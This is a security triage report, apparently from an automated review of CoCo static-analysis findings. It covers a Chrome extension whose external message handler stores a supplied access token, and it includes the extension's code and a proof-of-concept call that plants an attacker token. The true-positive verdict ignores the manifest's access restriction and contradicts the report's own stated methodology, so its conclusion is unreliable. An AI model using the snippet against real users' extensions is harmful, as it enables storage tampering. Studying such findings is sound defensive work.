# CoCo Analysis: kbhghidlilegihmipoohlboebekiigli

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/kbhghidlilegihmipoohlboebekiigli/opgen_generated_files/bg.js
Line 965: chrome.runtime.onMessageExternal.addListener with chrome.storage.local.set({access_token:e.token})

**Code:**

```javascript
// Background script (bg.js) - Line 965
chrome.runtime.onMessageExternal.addListener((function(e,o,r){
  console.log("message:",e);
  try{
    "storeToken"===e.action&&(
      chrome.storage.local.set({access_token:e.token}), // ← attacker-controlled token stored
      chrome.tabs.query({},(function(o){
        for(var s=0;s<o.length;s++){
          var t=o[s];
          chrome.tabs.sendMessage(t.id,{refreshData:!0},(function(e){
            chrome.runtime.lastError?console.error(chrome.runtime.lastError):console.log("Message sent to content script.")
          }))
        }
        r({success:"token saved!",message:e.token}) // ← attacker receives confirmation
      }))
    ),
    "removeToken"===e.action&&(
      chrome.storage.local.remove("access_token",(function(){
        var e=chrome.runtime.lastError;
        e&&console.error(e)
      })),
      chrome.tabs.query({},(function(o){
        for(var s=0;s<o.length;s++){
          var t=o[s];
          chrome.tabs.sendMessage(t.id,{refreshData:!0},(function(e){
            chrome.runtime.lastError?console.error(chrome.runtime.lastError):console.log("Message sent to content script.")
          }))
        }
        r({success:"Token removed",message:e.token})
      }))
    )
  }catch(e){
    console.log("onMessageExternal error:",e)
  }
}))
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External Message (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From https://app.seopilot.io/* (whitelisted domain) or any other extension
// According to CRITICAL ANALYSIS RULES, we IGNORE manifest.json externally_connectable restrictions

// Malicious website sends external message to poison storage
chrome.runtime.sendMessage(
  'kbhghidlilegihmipoohlboebekiigli',  // Extension ID
  {
    action: 'storeToken',
    token: 'malicious_token_value'  // Attacker-controlled token
  },
  function(response) {
    console.log(response);  // Receives: {success: "token saved!", message: "malicious_token_value"}
  }
);
```

**Impact:** Storage poisoning with complete exploitation chain. The attacker can:
1. Store arbitrary token values via external message
2. Receive confirmation that the poisoned data was stored (via sendResponse callback)
3. The poisoned token is used by content scripts when they receive {refreshData: true} messages
4. This constitutes a complete storage exploitation chain: attacker data → storage.set → retrieval by content scripts → attacker receives confirmation

While the methodology states "storage poisoning alone is NOT a vulnerability," this case includes the complete exploitation chain where:
- Attacker sends data (token) via external message
- Data is stored in chrome.storage.local
- Attacker receives confirmation response via sendResponse
- Content scripts retrieve and use the poisoned token when refreshing data
- The external message handler provides direct feedback to the attacker about success

This is a TRUE POSITIVE because the attacker has complete control over the token storage and can observe the success of the operation.
